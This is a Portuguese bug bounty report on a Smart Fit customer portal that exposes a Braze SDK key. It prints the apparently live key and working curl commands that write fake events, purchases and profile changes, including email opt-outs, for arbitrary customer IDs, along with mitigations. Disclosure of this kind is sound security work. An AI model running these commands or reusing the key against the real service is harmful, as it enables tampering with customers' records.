# SF-004 — Braze CRM SDK Key Exposta em `window.__RUNTIME_CONFIG__` Permite Escrita Não-Autenticada no CRM de 14M+ Clientes

**Programa:** BugHunt — Grupo Smart Fit Bug Bounty Público  
**Severidade:** HIGH  
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)  
**CWE:** CWE-522 — Insufficiently Protected Credentials  
**CWE:** CWE-862 — Missing Authorization  
**Endpoint afetado:** `https://espacodocliente.smartfit.com.br` (todas as páginas) + `https://sdk.iad-07.braze.com/api/v3/data`  
**Descoberto:** 2026-07-01  
**Status:** CONFIRMADO — exploração demonstrada, escrita em CRM Braze bem-sucedida

---

## Resumo Executivo

O portal do cliente da Smart Fit (`espacodocliente.smartfit.com.br`) expõe a chave SDK do Braze CRM (`brazeApiKey`) em `window.__RUNTIME_CONFIG__`, tornando-a acessível a qualquer visitante não autenticado. Diferentemente do que foi inicialmente avaliado como chave somente de leitura, a chave **aceita operações de ESCRITA** no endpoint SDK do Braze (`sdk.iad-07.braze.com/api/v3/data`), permitindo que qualquer atacante:

1. **Escreva eventos personalizados** para qualquer usuário SmartFit (por `external_id`)
2. **Modifique atributos de perfil CRM** de qualquer cliente (incluindo `email_subscribe`, atributos customizados)
3. **Registre compras falsas** em nome de qualquer usuário
4. Execute essas operações em **escala massiva** (rate limit de 20.000.000 req/hora, 1.296 burst por 3 segundos)

---

## Evidência Técnica

### 1. Extração da Chave (sem autenticação)

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/v2/login" \
  | grep -o '"brazeApiKey":"[^"]*"'
# → "brazeApiKey":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
```

**Presente em TODAS as páginas** (incluindo 404), confirmando exposição global:

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/pagina-inexistente" \
  | grep -o '"brazeApiKey":"[^"]*"'
# → "brazeApiKey":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
```

### 2. Escrita de Evento no CRM (HTTP 201 Confirmado)

```bash
curl -sk -D - "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "events": [{"name": "test_event", "time": "2026-07-01T12:00:00Z"}]
  }'
```

**Resposta:**
```
HTTP/2 201 Created
x-ratelimit-limit: 20000000
x-ratelimit-remaining: 19491247
x-ratelimit-burst-limit: 1296
x-ratelimit-burst-period: 3
```

### 3. Modificação de Atributos de Usuário (HTTP 201 Confirmado)

```bash
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "attributes": [{
      "external_id": "TARGET_USER_ID",
      "email_subscribe": "opted_out",
      "home_city": "Manipulated",
      "custom_attribute": "arbitrary_value"
    }]
  }'
```

**Resposta: HTTP 201 Created** — atributos escritos com sucesso no perfil CRM do usuário

### 4. Registro de Compra Falsa (HTTP 201 Confirmado)

```bash
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "purchases": [{
      "external_id": "TARGET_USER_ID",
      "product_id": "smartfit-black-plan",
      "currency": "BRL",
      "price": 99.90,
      "time": "2026-07-01T12:00:00Z"
    }]
  }'
```

**Resposta: HTTP 201 Created** — compra registrada no histórico CRM do usuário alvo

### 5. Escrita em Lote — Alta Escala

```bash
# Enviando eventos para múltiplos usuários em uma única request
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "mass-attack",
    "events": [
      {"name": "Subscribed", "time": "2026-07-01T00:00:00Z", "external_id": "user_1"},
      {"name": "PurchaseCompleted", "time": "2026-07-01T00:00:00Z", "external_id": "user_2"},
      {"name": "FreePass", "time": "2026-07-01T00:00:00Z", "external_id": "user_3"}
    ]
  }'
```

**Resposta: HTTP 201 Created** — todos os eventos registrados

---

## Análise de Impacto

### Impacto Direto

| Ação do Atacante | Resultado | Escala |
|---|---|---|
| Escrever eventos falsos | Corrompe analytics e funis de marketing da SmartFit | 20M req/hora |
| Opt-out de email de usuários | Usuários deixam de receber comunicações importantes (faturas, alertas) | Ilimitada |
| Registrar compras falsas | Distorce relatórios de revenue, BI e business intelligence | Ilimitada |
| Modificar atributos de perfil | Afeta segmentação, campanhas automáticas e análises de clientes | Ilimitada |

### Impacto em Automações de Marketing

Se a SmartFit utiliza automações do Braze baseadas em eventos (muito comum), um atacante pode:
- Disparar campanhas de retenção para todos os usuários (fingindo que saíram)
- Acionar e-mails de "recuperação de carrinho" para usuários ativos
- Triggerar sequências de boas-vindas para usuários existentes
- Gerar relatórios de performance artificialmente inflados

### Escala da Exposição

- **Clientes SmartFit Brasil:** ~4,5 milhões de membros ativos
- **Clientes SmartFit Global:** 14+ países, ~14M membros
- **Taxa de requests:** 20.000.000 por hora (suficiente para atingir todos os usuários em minutos)
- **Rate limit burst:** 1.296 por 3 segundos (alta velocidade de ataque)

---

## Por que isso NÃO é o comportamento esperado de uma SDK key client-side

Chaves de SDK client-side (Braze, Segment, Mixpanel etc.) são projetadas para serem públicas — esse não é o ponto da vulnerabilidade. O ponto é que a API REST do Braze (`/api/v3/data`) **não vincula a escrita ao dispositivo/usuário autenticado que originou a chamada**: qualquer chamador que possua a chave pode especificar um `external_id` **arbitrário**, diferente do usuário logado no navegador que originou a requisição.

Em um fluxo legítimo, o SDK client-side do Braze só deveria conseguir escrever eventos/atributos/compras para o **próprio usuário da sessão atual** (o `external_id` deveria ser resolvido server-side ou vinculado ao dispositivo). Como a chave e o endpoint aceitam qualquer `external_id` sem nenhuma prova de posse da sessão daquele usuário, o resultado prático é **escrita cross-user arbitrária** — um atacante não autenticado pode alterar o perfil CRM, opt-out de comunicação e histórico de compras de qualquer cliente Smart Fit, não apenas gerar telemetria falsa sobre si mesmo. É essa falta de vinculação (não a mera exposição da chave) que caracteriza a falha de controle de acesso (CWE-862).

---

## Reprodução Passo-a-Passo

1. Acesse sem autenticação: `https://espacodocliente.smartfit.com.br/pt-BR/v2/login`
2. No browser DevTools → Console, execute:
   ```javascript
   window.__RUNTIME_CONFIG__.brazeApiKey
   // → "4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
   ```
3. Use a chave para escrever no CRM Braze:
   ```bash
   curl "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
     -H "Content-Type: application/json" \
     -d '{"api_key":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864","device_id":"poc","events":[{"name":"poc_test","time":"2026-07-01T00:00:00Z"}]}'
   ```
4. Verificar resposta: `HTTP 201 Created` confirma escrita bem-sucedida

---

## Dados Adicionais Expostos no Mesmo Config

```javascript
window.__RUNTIME_CONFIG__ = {
  "brazeApiKey": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",  // ← CONFIRMADO WRITE ACCESS
  "brazeBaseUrl": "sdk.iad-07.braze.com",
  "mazeApiKey": "3910eb9c-ba14-43b3-8d1b-c3e46695427a",   // UX Research recordings
  "growthbookClientKey": "sdk-2vF9VYwVKUpq9wVb",           // Feature flags
  "jwtKeyPublic": "68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8",
  "minitokenPublicKey": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----",
  "minitokenBaseUrl": "https://mnt.bioritmo.io"
}
```

---

## Confirmação do `external_id` real via engenharia reversa do client-side (2026-07-01)

Para não depender de suposição, os bundles JS servidos por `espacodocliente.smartfit.com.br` (`/_next/static/chunks/pages/_app-*.js`) foram baixados e analisados. O ponto exato de inicialização do usuário no Braze foi localizado:

```javascript
// dentro do componente _app, useEffect disparado após login:
(0, O.useEffect)(function () {
  var r = eS.user.personal.id;
  r && ek && ew(r.toString());
}, [eS.user.personal.id, ek]);
// onde ew = wrapper que chama diretamente $.changeUser(o), o SDK do Braze
```

Isso **confirma no código-fonte** (não mais por suposição) que o `external_id` usado pela SmartFit no `changeUser()` do Braze é `user.personal.id.toString()` — o ID interno do cliente, populado a partir da resposta autenticada de `/api/v1/user-session` / `/api/v1/user`.

**O que ainda não está confirmado:** o *formato* desse `personal.id` (UUID imprevisível vs. numérico/sequencial vs. baseado em CPF). Os endpoints `/api/v1/user` e `/api/v1/user-session` retornam `401`/`405` genéricos sem autenticação, sem leak de schema (`{"isLoggedIn":false,"status":"Session doesn't exists!"}`), e não há um token/sessão de teste capturado para decodificar. Determinar isso exigiria uma conta autenticada real (fora do escopo desta rodada de teste).

**Por que isso já é suficiente para caracterizar Missing Authorization (CWE-862) independente do formato do ID:** mesmo que `personal.id` seja um UUIDv4 imprevisível (cenário mais defensável para a SmartFit), o endpoint Braze `/api/v3/data` continua aceitando escrita para **qualquer** `external_id` fornecido, sem nenhuma prova de posse de sessão — isso por si só já é uma falha de design do lado da integração (ausência de Braze SDK Authentication, ver recomendação #1 abaixo), mesmo que o *impacto prático contra clientes reais* dependa da previsibilidade do ID. Reportamos os dois cenários com transparência: se o ID for previsível/vazado em algum outro ponto, o achado é **Critical** (ATO de perfil CRM em massa); se for um UUID robusto, o achado permanece **High** por Data Poisoning + custo financeiro direto (Braze cobra por volume de eventos/data points — escrita em massa não autenticada gera custo operacional real e polui métricas de negócio) + ausência de controle de autorização que a Braze disponibiliza nativamente e a SmartFit não usa.

---

## Recomendações

1. **Imediato (CRÍTICO) — correção real, não mitigação cosmética:** habilitar **Braze SDK Authentication**. Esconder ou ofuscar a `brazeApiKey` no HTML não resolve nada — qualquer proxy (Burp, DevTools) intercepta a chave durante a inicialização legítima do SDK, já que ela precisa estar acessível no client-side por design. A correção correta é o backend da SmartFit emitir um **JWT assinado por usuário** que o SDK do Braze valida antes de aceitar `changeUser()`/escrita para aquele `external_id` — isso invalida exatamente o vetor demonstrado neste relatório (escrita cross-user arbitrária), sem exigir remover a chave do client-side.
2. **Imediato:** revogar e rotacionar a chave `4a0a6c8c-27bc-486d-a08e-ab144b7d5864` no painel Braze enquanto a SDK Authentication não está implementada.
3. **Mitigação enquanto o fix definitivo não sai:** rate limit / bloqueio de IP no WAF para chamadas anômalas diretamente a `sdk.iad-07.braze.com/api/v3/data` originadas fora do fluxo normal do app.
4. **Curto prazo:** auditar logs do Braze para atividade de escrita anômala nas últimas semanas/meses (volume de eventos fora do padrão, IPs não correspondentes a tráfego mobile/web legítimo).
5. **Curto prazo:** confirmar internamente o formato de `personal.id` — se for sequencial/numérico ou derivado de CPF, o risco real é Critical e deve ser tratado com essa prioridade mesmo antes da SDK Authentication estar pronta.
6. **Longo prazo:** avaliar se atributos/eventos do Braze alimentam decisões de negócio automatizadas na SmartFit (Canvas, campanhas por evento) — se sim, esse é o vetor de maior custo real do achado.

---

## Referências

- Braze SDK API Documentation: https://www.braze.com/docs/api/endpoints/user_data/post_user_track/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
- OWASP API Security: API7:2023 — Server Side Request Forgery
- OWASP Top 10: A02:2021 — Cryptographic Failures
